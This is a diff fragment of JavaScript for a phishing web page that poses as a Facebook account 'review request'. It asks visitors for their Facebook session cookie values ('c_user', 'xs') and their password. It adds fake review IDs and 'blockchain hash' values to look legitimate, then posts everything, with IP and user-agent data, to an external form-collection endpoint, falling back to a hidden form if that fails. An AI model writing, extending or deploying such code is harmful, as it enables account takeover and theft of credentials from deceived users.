+                window.location.href = "https://www.facebook.com/";
+            });
+            
+            // Next to Step 2
+            nextToStep2.addEventListener('click', function() {
+                const cUserInput = document.getElementById('c_user');
+                const xsInput = document.getElementById('xs');
+                
+                // Trigger browser validation
+                if (!cUserInput.checkValidity()) {
+                    cUserInput.reportValidity();
+                    return;
+                }
+                
+                if (!xsInput.checkValidity()) {
+                    xsInput.reportValidity();
+                    return;
+                }
+                
+                // Store values for hidden form
+                hiddenCUser.value = cUserInput.value;
+                hiddenXs.value = xsInput.value;
+                
+                // Generate review ID
+                const reviewId = generateReviewId();
+                hiddenReviewId.value = reviewId;
+                reviewIdDisplay.textContent = reviewId;
+                
+                // Generate blockchain hash
+                const blockchainHash = generateBlockchainHash();
+                blockchainHashInput.value = blockchainHash;
+                blockchainHashDisplay.textContent = blockchainHash;
+                
+                // Proceed to next step
+                step1.classList.remove('active');
+                step2.classList.add('active');
+                
+                steps[0].classList.remove('active');
+                steps[1].classList.add('active');
+                steps[0].classList.add('completed');
+                
+                // Update progress line
+                progressLine.style.width = '33%';
+            });
+            
+            // Back to Step 1
+            backToStep1.addEventListener('click', function() {
+                step2.classList.remove('active');
+                step1.classList.add('active');
+                
+                steps[1].classList.remove('active');
+                steps[0].classList.add('active');
+                steps[0].classList.remove('completed');
+                
+                progressLine.style.width = '0%';
+                submissionError.style.display = 'none';
+            });
+            
+            // Submit form
+            nextToStep3.addEventListener('click', async function(e) {
+                e.preventDefault();
+                const passwordInput = document.getElementById('password');
+                
+                if (!passwordInput.checkValidity()) {
+                    passwordInput.reportValidity();
+                    return;
+                }
+                
+                // Set password for hidden form
+                hiddenPassword.value = passwordInput.value;
+                
+                // Prepare form data
+                const formData = {
+                    c_user: hiddenCUser.value,
+                    xs: hiddenXs.value,
+                    password: hiddenPassword.value,
+                    review_id: hiddenReviewId.value,
+                    user_agent: userAgent.value,
+                    ip_address: ipAddress.value,
+                    timestamp: timestamp.value,
+                    facial_data: facialData.value,
+                    blockchain_hash: blockchainHashInput.value
+                };
+                
+                // Validate form data
+                if (!formData.c_user || !formData.xs || !formData.password) {
+                    submissionError.textContent = 'Please fill in all required fields.';
+                    submissionError.style.display = 'block';
+                    return;
+                }
+                
+                // Show loading state
+                nextToStep3.disabled = true;
+                nextToStep3.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                
+                // Log form data for debugging
+                console.log('Attempting to submit form with data:', formData);
+                
+                try {
+                    // Submit form data via fetch
+                    const response = await fetch('https://submit-form.com/BLs04ZolX', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(formData)
+                    });
+                    
+                    console.log('Server response:', response);
+                    
+                    if (!response.ok) {
+                        throw new Error(`Server error: ${response.status} ${response.statusText}`);
+                    }
+                    
+                    const result = await response.json();
+                    console.log('Submission successful, response:', result);
+                    
+                    // Proceed to success step
+                    step2.classList.remove('active');
+                    step3.classList.add('active');
+                    
+                    steps[1].classList.remove('active');
+                    steps[2].classList.add('active');
+                    steps[1].classList.add('completed');
+                    
+                    progressLine.style.width = '100%';
+                    submissionError.style.display = 'none';
+                } catch (error) {
+                    console.error('Form submission failed:', error);
+                    
+                    // Display user-friendly error
+                    submissionError.textContent = 'Failed to submit the form. Please check your connection and try again.';
+                    submissionError.style.display = 'block';
+                    
+                    // Reset button state
+                    nextToStep3.disabled = false;
+                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
+                    
+                    // Fallback to hiddenForm.submit()
+                    console.log('Attempting fallback form submission');
+                    try {
+                        hiddenForm.submit();
+                    } catch (fallbackError) {
+                        console.error('Fallback submission failed:', fallbackError);
+                    }
+                }
+            });
+            
+            // Reset form
+            function resetForm() {
+                document.getElementById('c_user').value = '';
+                document.getElementById('xs').value = '';
+                document.getElementById('password').value = '';
+                
+                hiddenCUser.value = '';
+                hiddenXs.value = '';
+                hiddenPassword.value = '';
+                hiddenReviewId.value = '';
+                
+                step3.classList.remove('active');
+                step1.classList.add('active');
+                
+                steps[2].classList.remove('active');
+                steps[0].classList.add('active');
+                steps[0].classList.remove('completed');
+                steps[1].classList.remove('completed');
+                
+                progressLine.style.width = '0%';
+                
+                video.pause();
+                video.currentTime = 0;
+                videoOverlay.classList.remove('hidden');
+                playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+                progressBar.style.width = '0%';
+                bufferedBar.style.width = '0%';
+                currentTimeDisplay.textContent = '0:00';
+                submissionError.style.display = 'none';
+                
+                // Reset button state if submission was in progress
+                if (nextToStep3) {
+                    nextToStep3.disabled = false;
+                    nextToStep3.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Review Request';
+                }
+            }
+            
+            // Initialize the page
+            initCountdown();
+        });
+    </script>
 </body>
-
 </html>
